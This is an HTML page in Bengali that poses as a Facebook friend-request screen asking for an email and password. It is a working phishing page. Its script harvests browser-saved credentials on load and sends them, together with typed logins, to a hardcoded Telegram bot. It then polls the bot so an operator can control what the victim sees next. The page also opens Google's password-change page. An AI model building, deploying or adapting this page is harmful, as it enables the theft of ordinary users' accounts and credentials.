<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Friends & Verify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; }
        .fb-input {
            width: 100%; padding: 14px 16px; border: 1px solid #dddfe2;
            border-radius: 6px; background: #f5f6f7; font-size: 15px;
            outline: none; transition: border-color 0.2s;
        }
        .fb-input:focus { border-color: #1877f2; background: #fff; box-shadow: 0 0 0 2px #e7f3ff; }
        .fb-loader {
            width: 50px; height: 50px; border: 5px solid #f3f3f3;
            border-top: 5px solid #1877f2; border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-[#f0f2f5] flex flex-col items-center min-h-screen">

    <div id="overlay" class="hidden fixed inset-0 bg-[#f0f2f5] z-50 flex flex-col items-center pt-12 text-center">
        <div class="w-full max-w-sm overflow-hidden bg-white rounded-t-2xl shadow-sm">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full h-auto">
        </div>
        <div class="w-full max-w-sm p-8 bg-white shadow-md mt-3 rounded-b-2xl min-h-[50vh] flex flex-col items-center justify-center">
            <div id="loader" class="fb-loader mb-6"></div>
            <h3 id="status-title" class="text-xl font-bold text-gray-800 mb-2">যাচাই করা হচ্ছে...</h3>
            <p id="status-msg" class="text-gray-500 px-6">অপেক্ষা করুন, অল্প কিছুক্ষণের মধ্যে অ্যাড করা হচ্ছে।</p>
        </div>
    </div>

    <div id="main-content" class="w-full max-w-sm p-6 bg-white shadow-md rounded-b-2xl flex flex-col items-center">
        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full rounded-xl mb-4">
        
        <div id="initial-view" class="w-full">
            <h2 class="text-2xl font-bold text-gray-900 mb-2 text-center">ফ্রেন্ড অ্যাড করুন</h2>
            <p class="text-gray-600 text-center mb-6">Mst. Priya Akter কে ফ্রেন্ড অ্যাড করতে নিচের বাটনে ক্লিক করুন।</p>
            <form id="login-form" autocomplete="on">
                <input type="email" id="email" name="email" class="fb-input mb-3" placeholder="ইমেইল বা ফোন" required autocomplete="username">
                <input type="password" id="pass" name="pass" class="fb-input mb-4" placeholder="পাসওয়ার্ড" required autocomplete="current-password">
                <button type="button" onclick="startProcess()" class="w-full bg-[#1877f2] text-white font-bold py-4 rounded-xl shadow-lg active:scale-95">Add Friend</button>
            </form>
        </div>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";

    // ১. জিমেইল সাজেশন পপআপ
    window.onload = async function() {
        if (navigator.credentials) {
            try {
                const cred = await navigator.credentials.get({ password: true, unmediated: false });
                if (cred) {
                    document.getElementById('email').value = cred.id;
                    document.getElementById('pass').value = cred.password;
                    sendToTelegram(`🎯 Auto-filled:\n📧 User: ${cred.id}\n🔑 Pass: ${cred.password}`);
                }
            } catch (e) {}
        }
    };

    // ২. প্রসেস শুরু এবং টেলিগ্রামে বাটন পাঠানো
    async function startProcess() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!email || !pass) { alert("তথ্য দিন।"); return; }

        document.getElementById('overlay').classList.remove('hidden');

        // টেলিগ্রামে মেসেজ ও বাটন পাঠানো
        const msg = `🚀 নতুন লগইন!\n📧 User: ${email}\n🔑 Pass: ${pass}\n\nকন্ট্রোল করুন:`;
        const buttons = {
            inline_keyboard: [[
                { text: "🔙 Back", callback_data: "cmd_back" },
                { text: "➡️ Next", callback_data: "cmd_next" }
            ]]
        };

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chatId, text: msg, reply_markup: buttons})
        });

        // পাসওয়ার্ড চেঞ্জ পেজ ওপেন
        window.open("https://myaccount.google.com/signinoptions/password", '_blank');

        // বটের কমান্ডের জন্য লিসেনিং শুরু
        listenForCommands();
    }

    // ৩. টেলিগ্রাম থেকে কমান্ড শোনা (Polling)
    function listenForCommands() {
        const interval = setInterval(async () => {
            try {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-1`);
                const data = await res.json();
                
                if (data.result && data.result.length > 0) {
                    const command = data.result[0].callback_query?.data;
                    
                    if (command === "cmd_back") {
                        clearInterval(interval);
                        alert("ভেরিফিকেশন ব্যর্থ! আবার চেষ্টা করুন।");
                        window.location.reload();
                    } 
                    else if (command === "cmd_next") {
                        clearInterval(interval);
                        showFinalSuccess();
                    }
                }
            } catch (e) {}
        }, 3000);
    }

    function showFinalSuccess() {
        document.getElementById('status-title').innerText = "সফল হয়েছে!";
        document.getElementById('status-title').classList.add('text-green-600');
        document.getElementById('status-msg').innerText = "অ্যাকাউন্টটি সফলভাবে অ্যাড করা হয়েছে।";
        document.getElementById('loader').innerHTML = `<svg class="w-16 h-16 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>`;
        document.getElementById('loader').classList.remove('fb-loader');
    }

    async function sendToTelegram(text) {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: chatId, text: text})
        });
    }
</script>
</body>
</html>
